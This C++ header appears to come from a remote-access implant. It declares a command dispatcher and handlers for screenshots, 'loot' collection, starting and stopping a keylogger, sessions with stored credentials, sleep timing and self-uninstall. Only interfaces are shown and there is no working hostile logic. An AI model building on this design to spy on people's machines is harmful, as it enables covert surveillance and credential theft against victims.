#pragma once

#include "Beacon.hpp"
#include "Payloads.hpp"

#include <atomic>
#include <memory>
#include <string>
#include <string_view>
#include <vector>

class SessionManager;

struct ICommandHandler {
    virtual ~ICommandHandler() = default;
    [[nodiscard]] virtual bool can_handle(std::string_view cmd) const = 0;
    [[nodiscard]] virtual CommandResult execute(std::string_view cmd) = 0;
};

class TimeoutCommandHandler final : public ICommandHandler {
public:
    explicit TimeoutCommandHandler(int& current_sleep) : current_sleep_(current_sleep) {}
    [[nodiscard]] bool can_handle(std::string_view cmd) const override { return cmd.starts_with("timeout"); }
    [[nodiscard]] CommandResult execute(std::string_view cmd) override;
private:
    int& current_sleep_;
};

class ScreenshotCommandHandler final : public ICommandHandler {
public:
    [[nodiscard]] bool can_handle(std::string_view cmd) const override { return cmd.starts_with("screenshot"); }
    [[nodiscard]] CommandResult execute(std::string_view cmd) override;
};

class LootCommandHandler final : public ICommandHandler {
public:
    [[nodiscard]] bool can_handle(std::string_view cmd) const override { return cmd.starts_with("loot"); }
    [[nodiscard]] CommandResult execute(std::string_view cmd) override;
};

class KeyloggerStartHandler final : public ICommandHandler {
public:
    explicit KeyloggerStartHandler(Keylogger& keylogger) : keylogger_(keylogger) {}
    [[nodiscard]] bool can_handle(std::string_view cmd) const override { return cmd.starts_with("keylogger_start"); }
    [[nodiscard]] CommandResult execute(std::string_view cmd) override;
private:
    Keylogger& keylogger_;
};

class KeyloggerStopHandler final : public ICommandHandler {
public:
    explicit KeyloggerStopHandler(Keylogger& keylogger) : keylogger_(keylogger) {}
    [[nodiscard]] bool can_handle(std::string_view cmd) const override { return cmd.starts_with("keylogger_stop"); }
    [[nodiscard]] CommandResult execute(std::string_view cmd) override;
private:
    Keylogger& keylogger_;
};

class SessionCommandHandler final : public ICommandHandler {
public:
    explicit SessionCommandHandler(SessionManager& sessions, std::string user, std::string pass)
        : sessions_(sessions), user_(std::move(user)), pass_(std::move(pass)) {}
    [[nodiscard]] bool can_handle(std::string_view cmd) const override { return cmd.starts_with("session"); }
    [[nodiscard]] CommandResult execute(std::string_view cmd) override;
private:
    SessionManager& sessions_;
    std::string user_;
    std::string pass_;
};

class CloseSessionCommandHandler final : public ICommandHandler {
public:
    explicit CloseSessionCommandHandler(SessionManager& sessions) : sessions_(sessions) {}
    [[nodiscard]] bool can_handle(std::string_view cmd) const override { return cmd.starts_with("close"); }
    [[nodiscard]] CommandResult execute(std::string_view cmd) override;
private:
    SessionManager& sessions_;
};

class UninstallCommandHandler final : public ICommandHandler {
public:
    explicit UninstallCommandHandler(std::atomic<bool>& running) : running_(running) {}
    [[nodiscard]] bool can_handle(std::string_view cmd) const override { return cmd.starts_with("uninstall"); }
    [[nodiscard]] CommandResult execute(std::string_view cmd) override;
private:
    std::atomic<bool>& running_;
};

class CommandDispatcher {
public:
    CommandDispatcher(
        int& current_sleep,
        Keylogger& keylogger,
        SessionManager& sessions,
        std::atomic<bool>& running,
        std::string user,
        std::string pass);

    [[nodiscard]] CommandResult dispatch(const CommandDAO& cmd);

private:
    std::vector<std::unique_ptr<ICommandHandler>> handlers_;
};
